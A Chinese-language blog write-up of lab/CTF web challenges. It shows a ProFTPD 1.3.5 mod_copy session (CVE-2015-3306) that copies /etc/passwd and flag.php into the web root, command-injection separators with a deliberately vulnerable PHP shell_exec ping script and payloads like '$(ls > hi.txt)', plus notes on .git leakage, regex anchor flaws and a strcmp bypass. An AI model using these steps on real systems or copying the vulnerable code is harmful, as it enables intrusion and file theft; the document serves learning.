---
title: "Writeups #2: 被實習生霸凌的筆記區"
date: 2019-01-10 18:46:01
tags:
  - writeups
categories: Writeups
---

這是我們家實習生為了欺負我而架站出的題目(X)

[ProFTPD 1.3.5](#ProFTPD)
[Info Leakage](#InfoLeakage)
[Command Injection](#command)
[Regular Expression](#regular)
[HTTP](#http)
[MD5](#md5)
[PHP](#php)

<!--more-->

<h2 id='ProFTPD'>ProFTPD 1.3.5</h2>

CVE-2015–3306

```
telnet [ip] [port]
```

FTP command:

```
help
site cpfr [path] (copy from)
site cpto [path] (copy to)
```

```
Escape character is '^]'.
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [172.17.0.11]
help
214-The following commands are recognized (* =>'s unimplemented):
 CWD     XCWD    CDUP    XCUP    SMNT*   QUIT    PORT    PASV    
 EPRT    EPSV    ALLO*   RNFR    RNTO    DELE    MDTM    RMD     
 XRMD    MKD     XMKD    PWD     XPWD    SIZE    SYST    HELP    
 NOOP    FEAT    OPTS    AUTH*   CCC*    CONF*   ENC*    MIC*    
 PBSZ*   PROT*   TYPE    STRU    MODE    RETR    STOR    STOU    
 APPE    REST    ABOR    USER    PASS    ACCT*   REIN*   LIST    
 NLST    STAT    SITE    MLSD    MLST    
214 Direct comments to root@a84cc9e40260
site cpfr /etc/passwd
350 File or directory exists, ready for destination name
site cpto /var/www/html/hi.txt
250 Copy successful
site cpfr /var/www/html/flag.php
350 File or directory exists, ready for destination name
site cpto /var/www/html/ya.txt
250 Copy successful
421 Login timeout (300 seconds): closing control connection
Connection closed by foreign host.
```

把其他路徑的檔案複製到網站跟目錄做瀏覽 or 藉由複製檔案改變附檔名去存取其內容

<h2 id='InfoLeakage'>Info Leakage</h2>

某些編輯器預設自動備份檔案的部分

|vim|gedit|git|
|:--:|:--:|:--:|
|/.filename.ext.swp|/filename.ext~|/.git/|

如果 .git 資料夾 403，小工具 [GitDumper](https://medium.com/r/?url=https%3A%2F%2Fgithub.com%2Finternetwache%2FGitTools%2Ftree%2Fmaster%2FDumper)

<h2 id='command'>Command Injection</h2>

both Windows and Unix-based system:

* &
* &&
* |
* ||

only Unix-based

* ;
* Newline (0x0a or \n)
* `
* $()

ref: https://portswigger.net/web-security/os-command-injection?fbclid=IwAR2nHrTR75NLk2thwiO-x6CmKI1YpfdefoUGanjIDAXjtTOWFZFzZyqJdsg

結果不一定會回顯，但也可以把結果寫入另一個檔案存放於根目錄

```php
<?php
  $target = $_POST['target'];
  $result = shell_exec("ping -c1 ".$target);
  echo "<pre>".$result."</pre>";
?>
```

ex:
`8.8.8.8 $(ls)` 只回顯 ping 8.8.8.8 的資訊，不代表 ls 沒被執行可能只是沒有回顯
`8.8.8.8 $(ls > hi.txt)` 把 ls 結果寫入 hi.txt，接著去訪問 /hi.txt 確實有該目錄下資訊

補：會先執行 $() 裡面的命令，在將結果帶入原 command 中

<h2 id='regular'>Regular Expression</h2>

```
/^(([0–9]|[1–9][0–9]|1[0–9]{2}|2[0–4][0–9]|25[0–5])\.){3}([0–9]|[1–9][0–9]|1[0–9]{2}|2[0–4][0–9]|25[0–5])/
```

重點在後面沒有 $ 限制結尾，所以加什麼都 pass

[] 可以出現的字元
{} 可以接受的長度
^ 限制開頭
$ 限制結尾

<h2 id='http'>HTTP</h2>

[如何正確取得使用者IP](https://medium.com/r/?url=https%3A%2F%2Fdevco.re%2Fblog%2F2014%2F06%2F19%2Fclient-ip-detection%2F) by Devcore

> 「X-Forwarded-For」這個變數雖然「有機會」取得使用者的真實 IP，但是由於這個值是從客戶端傳送過來的，所以「有可能」被使用者竄改。

<h2 id='md5'>MD5</h2>

before PHP 5.3

```
# str1 = str2 return 0
int strcmp (string str1, string str2)
```

但出現 warning 也會 return 0，用陣列跟字串比較就會出現 0 了

<h2 id='php'>PHP</h2>

Variable variables

Execution Operators

## 後記

亂成這樣全世界大概只有我自己能勉強看懂吧（就是不好好整理），PHP 部分大概又會拖個沒完沒了（懶）
